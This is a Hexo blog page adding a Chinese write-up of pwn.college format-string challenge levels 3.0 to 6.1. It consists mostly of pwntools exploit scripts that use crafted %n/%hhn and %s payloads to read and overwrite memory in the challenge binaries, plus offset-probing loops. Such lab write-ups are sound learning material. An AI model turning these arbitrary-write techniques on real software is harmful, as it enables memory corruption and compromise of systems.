@@ -1,0 +1,738 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pwn-college中格式化字符串的学习（上）pwn.college level3.0from pwn import *;tt &#x3D; 40a &#x3D; [0]*ttp &#x3D; process(&quot;&#x2F;challenge&#x2F;babyfmt_level3.0&quot;)p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-college中格式化字符串的学习（上）">
+<meta property="og:url" content="http://example.com/2026/04/26/pwn-college%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="pwn-college中格式化字符串的学习（上）pwn.college level3.0from pwn import *;tt &#x3D; 40a &#x3D; [0]*ttp &#x3D; process(&quot;&#x2F;challenge&#x2F;babyfmt_level3.0&quot;)p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-04-26T01:10:28.000Z">
+<meta property="article:modified_time" content="2026-04-26T01:14:16.581Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>pwn-college中格式化字符串的学习（上） - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>poorjack&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Search</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light"
+               data-label-dark="Dark">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn-college中格式化字符串的学习（上）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-26 09:10" pubdate>
+          April 26, 2026 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn-college中格式化字符串的学习（上）</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    Last updated on April 26, 2026 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="pwn-college中格式化字符串的学习（上）"><a href="#pwn-college中格式化字符串的学习（上）" class="headerlink" title="pwn-college中格式化字符串的学习（上）"></a>pwn-college中格式化字符串的学习（上）</h1><p><a target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/format-string-exploits/">pwn.college</a></p>
+<h2 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h2><p><code>from pwn import *;</code><br><code>tt = 40</code><br><code>a = [0]*tt</code><br><code>p = process(&quot;/challenge/babyfmt_level3.0&quot;)</code><br><code>p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110))</code><br><code>p.interactive()</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(1,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level3.0&quot;)</code><br>    <code>p.send(f&quot;%{i}$p.&quot;.encode().ljust(9,b&#39;a&#39;) + p64(0x404110))</code><br>    <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>p.recvline()</code><br>    <code>a[i] = p.recvline()</code><br>    <code>p.kill()</code><br><code>for i in range(1,tt):</code><br>    <code>print(i,a[i])&#39;&#39;&#39;</code></p>
+<h2 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h2><p><code>from pwn import *;</code><br><code>tt = 100</code><br><code>a = [0]*tt</code><br><code>&#39;&#39;&#39;</code><br><code>p = process(&quot;/challenge/babyfmt_level3.1&quot;)</code><br><code>p.send(f&quot;%30$s&quot;.encode().ljust(6,b&#39;a&#39;)+p64(0x404080))</code><br><code>p.interactive()</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(0,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level3.1&quot;)</code><br>    <code>t = 0x4040c0+i</code><br>    <code>p.send(f&quot;%30$s.&quot;.encode().ljust(6,b&#39;a&#39;) + p64(t))</code><br>    <code>try:</code><br>        <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue;</code><br>    <code>p.recvline()</code><br>    <code>a[i] = p.recvline()</code><br>    <code>p.kill()</code><br><code>for i in range(1,tt):</code><br>    <code>print(i,a[i])</code><br>其中  readelf -S .&#x2F;babyfmt_level3.1 | grep .bss<br>(gdb) x&#x2F;80gx 0x404080 找到global</p>
+<h2 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h2><p><code>from pwn import *</code><br><code>p = process(&quot;/challenge/babyfmt_level4.0&quot;)</code><br><code>p.send(f&quot;%22$185c%23$hhn&quot;.encode().ljust(15,b&#39;a&#39;)+p64(0x404140))</code><br><code>#p.send(f&quot;%b9c%23$naaaaa.&quot;.encode()+p64(0x404140))</code><br><code>p.interactive()</code></p>
+<h2 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h2><p><code>from pwn import *;</code><br><code>tt = 39</code><br><code>a = [0]*tt</code><br><code>p = process(&quot;/challenge/babyfmt_level4.1&quot;)</code><br><code>p.send(f&quot;%3$70c%30$hhn&quot;.encode().ljust(19,b&#39;a&#39;)+p64(0x404118))</code><br><code>#p.send(f&quot;%b9c%23$naaaaa.&quot;.encode()+p64(0x404140))</code><br><code>p.interactive()</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(10,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level4.1&quot;)</code><br>    <code>t = 0x404118#+i</code><br>    <code>p.send(f&quot;%3$70c.%{i}$s.&quot;.encode().ljust(19,b&#39;a&#39;) + p64(t))</code><br>    <code>try:</code><br>        <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue;</code><br>    <code>p.recvline()</code><br>    <code>a[i] = p.recvline()</code><br>    <code>p.kill()</code><br><code>for i in range(1,tt):</code><br>    <code>print(i,a[i])&#39;&#39;&#39;</code></p>
+<h2 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h2><p><code>from pwn import *</code><br><code>tt = 40</code><br><code>a = [0]*tt</code><br><code>i=39</code><br><code>p = process(&quot;/challenge/babyfmt_level5.0&quot;)</code><br><code>b = [170,172,179,36,187,140,61,128]</code><br><code>aa = f&quot;&quot;</code><br><code>cur = 0</code><br><code>for j in range(8):</code><br>    <code>pad = (b[j]-cur)%0x100</code><br>    <code>aa +=f&quot;%{j+3}${pad}c%{i+j}$hhn&quot;</code><br>    <code>cur = (cur + pad)%0x100</code><br><code>aa = aa.encode().ljust(165,b&#39;a&#39;)</code><br><code>for j in range(8):</code><br>    <code>aa += p64(0x404130+j)</code><br><code>p.send(aa)</code><br><code>p.interactive() #0x803d8cbb24b3acaa</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(tt-20,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level5.0&quot;)</code><br>    <code>b = [170,168,179,36,187,140,61,128]</code><br>    <code>aa = f&quot;&quot;</code><br>    <code>for j in range(8):</code><br>        <code>aa +=f&quot;%{j+3}${b[j]}c.%{i+j}$p.&quot;</code><br>    <code>aa = aa.encode().ljust(165,b&#39;a&#39;)</code><br>    <code>for j in range(8):</code><br>        <code>aa += p64(0x404130+j)</code><br>    <code>p.send(aa)</code><br>    <code>try:</code><br>        <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>try:</code><br>        <code>p.recvline()</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>a[i] = p.recvuntil(&#39;And now,&#39;)</code><br>    <code>p.kill()</code><br><code>for i in range(tt-20,tt):</code><br>    <code>print(i,a[i])&#39;&#39;&#39;</code></p>
+<h2 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h2><p><code>from pwn import *</code><br><code>tt = 46</code><br><code>a = [0]*tt</code><br><code>i=53</code><br><code>p = process(&quot;/challenge/babyfmt_level5.1&quot;)</code><br><code>b = [0xc7,0x15,0xcc,0x32,0x69,0x28,0x72,0x28]</code><br><code>aa = f&quot;&quot;</code><br><code>cur = 0</code><br><code>for j in range(8):</code><br>    <code>pad = (b[j]-cur)%0x100</code><br>    <code>aa +=f&quot;%{j+3}${pad}c%{i+j}$hhn&quot;</code><br>    <code>cur = (cur + pad)%0x100</code><br><code>#a = f&quot;%3$170c.%{i}$s.%4$168c.%{i+1}$s.%5$179c.%{i+2}$s.%6$36c.%{i+3}$s.%7$187c.%{i+4}$s.%8$140c.%{i+5}$s.%9$61c.%{i+6}$s.%10$128c.%{i+7}$s.&quot;.encode()#.ljust(19,b&#39;a&#39;)</code><br><code>aa = aa.encode().ljust(165,b&#39;a&#39;)</code><br><code>for j in range(8):</code><br>    <code>aa += p64(0x404148+j)</code><br><code>p.send(aa)</code><br><code>#p.send(f&quot;%3$70c%30$hhn&quot;.encode().ljust(19,b&#39;a&#39;)+p64(0x404118))</code><br><code>#p.send(f&quot;%b9c%23$naaaaa.&quot;.encode()+p64(0x404140))</code><br><code>p.interactive() #0x803d8cbb24b3acaa</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(tt-20,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level5.1&quot;)</code><br>    <code>b = [0xc7,0x15,0xcc,0x32,0x69,0x28,0x72,0x28]</code><br>    <code>aa = f&quot;&quot;</code><br>    <code>cur = 0</code><br>    <code>for j in range(8):</code><br>        <code>pad = (b[j]-cur)%0xff</code><br>        <code>aa +=f&quot;%{j+3}${pad}c.%{i+j}$p.&quot;</code><br>        <code>cur = (cur + pad)%0xff</code><br>    <code>aa = aa.encode().ljust(165,b&#39;a&#39;)</code><br>    <code>for j in range(8):</code><br>        <code>aa += p64(0x404148+j)</code><br>    <code>p.send(aa)</code><br>    <code>try:</code><br>        <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>try:</code><br>        <code>p.recvline()</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>a[i] = p.recvuntil(&#39;And now,&#39;)</code><br>    <code>p.kill()</code><br><code>for i in range(tt-20,tt):</code><br>    <code>print(i,a[i])&#39;&#39;&#39;</code></p>
+<h2 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h2><p><code>from pwn import *</code><br><code>tt = 70</code><br><code>a = [0]*tt</code></p>
+<p><code>i=53</code><br><code>p = process(&quot;/challenge/babyfmt_level6.0&quot;)</code><br><code>p.send(f&quot;%61$*61$c%26$n&quot;.encode().ljust(28,b&#39;a&#39;)+p64(0x404170))</code><br><code>out=p.recvall(timeout=30)</code><br><code>print(out[-500:].decode(errors=&#39;ignore&#39;))</code></p>
+<p>这道题不能直接p.interactive(),输入太长ssh一直会断，直接打印输出即可，动调代码：</p>
+<p><code>from pwn import *</code><br><code>tt = 70</code><br><code>a = [0]*tt</code><br><code>i=53</code><br><code>for j in range(tt-20,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level6.0&quot;)</code><br>    <code>p.send(f&quot;%10$*{j}c%26$p%29${j}x&quot;.encode().ljust(26,b&#39;a&#39;)+p64(0x404170))</code><br>    <code>try:</code><br>        <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>try:</code><br>        <code>p.recvline()</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>a[j] = p.recvuntil(&#39;And now,&#39;)</code><br>    <code>p.kill()</code><br><code>for i in range(tt-20,tt):</code><br>    <code>print(i,a[i])</code><br><code>p.interactive() #%10$*61c%30$n</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(tt-20,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level6.0&quot;)</code><br>    <code>p.send(f&quot;%{i}$p.&quot;.encode())</code><br>    <code>try:</code><br>        <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>try:</code><br>        <code>p.recvline()</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue</code><br>    <code>a[i] = p.recvuntil(&#39;And now,&#39;)</code><br>    <code>p.kill()</code><br><code>for i in range(tt-20,tt):</code><br>    <code>print(i,a[i])&#39;&#39;&#39;</code></p>
+<h2 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h2><p><code>from pwn import *</code><br><code>p = process(&#39;/challenge/babyfmt_level6.1&#39;)</code><br><code>p.send(f&#39;%67$*67$c%30$n&#39;.encode().ljust(25,b&#39;a&#39;)+p64(0x404138))</code><br><code>out = p.recvall(timeout = 30)</code><br><code>print(out[-500:].decode(errors = &#39;ignore&#39;))</code></p>
+<p>调试同理，地址gdb check_win即可</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn-college中格式化字符串的学习（上）</div>
+      <div>http://example.com/2026/04/26/pwn-college中格式化字符串的学习（上）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 26, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/05/11/wslset/" title="基于wsl的pwn环境配置">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">基于wsl的pwn环境配置</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/25/0psu3%E7%BA%BF%E4%B8%8B%E8%B5%9B-ciallo_wp/" title="0psu3线下赛-ciallo_wp">
+                        <span class="hidden-mobile">0psu3线下赛-ciallo_wp</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      &copy; 2024 PJ. Powered by <a href='https://hexo.io' target='_blank'>Hexo</a> &amp; <a href='https://github.com/fluid-dev/hexo-theme-fluid' target='_blank'>Fluid</a>.
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
